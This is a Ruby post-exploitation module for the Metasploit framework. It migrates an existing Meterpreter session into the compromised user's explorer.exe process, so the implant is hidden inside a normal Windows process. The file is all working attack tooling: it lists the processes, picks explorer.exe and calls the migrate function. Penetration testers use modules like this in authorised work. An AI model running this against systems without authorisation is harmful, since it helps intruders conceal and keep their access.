##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'User explorer.exe Process Migration',
      'Description'   => %q{ Module will migrate new session to a user's "explorer.exe" process,
          as in a virtualized desktop environments there may be multiple users' "explorer.exe" processes on each virtual server.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'j00c3'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

  end

  # Run Method for when "run" command is issued
  def run
    begin
      session_id = session.name.to_s
      target_process = get_explorer_process(session_id)[0]
      target_process_name = target_process['name']
      target_pid_string = target_process['pid'].to_s  # since we can't print string + integer
      target_process_owner = target_process['user']

      # for orphaned session reattachment, check if Meterpreter already in "explorer.exe"
      current_pid = client.sys.process.getpid
      if current_pid == target_process['pid']
        print_error "Session #{session_id} is already in #{target_process_owner}'s \"explorer.exe\" process (PID: #{current_pid})!"
        return false
      end
      
      print_status "Session ID #{session_id}: Migrating to \"#{target_process_name}\", PID #{target_pid_string}, owner \"#{target_process_owner}\"."
      client.core.migrate(target_process['pid'])
      print_good "Session ID #{session_id}: Successfully migrated to \"#{target_process_name}\", PID #{target_pid_string}, owner \"#{target_process_owner}\"."
      return true

    rescue ::Exception => e
      print_error "Session ID #{session_id}: Unable to migrate to \"#{target_process_name}\", PID: #{target_pid_string}, owner \"#{target_process_owner}\"."
      return false

    end
    
  end

  def get_explorer_process(session_id)
    uid = client.sys.config.getuid
    user_explorer_processes = []
    process_list = client.sys.process.get_processes

    # just to be safe, although there should only be one "explorer.exe" per user
    process_list.each do |process|
      user_explorer_processes << process if process['name'] == 'explorer.exe' and process['user'] == uid
    end
     
    if user_explorer_processes
      print_good "Session ID #{session_id}: User #{uid}'s \"explorer.exe\" process found."
    else
      return
    end
    
    return user_explorer_processes

  end
  
end
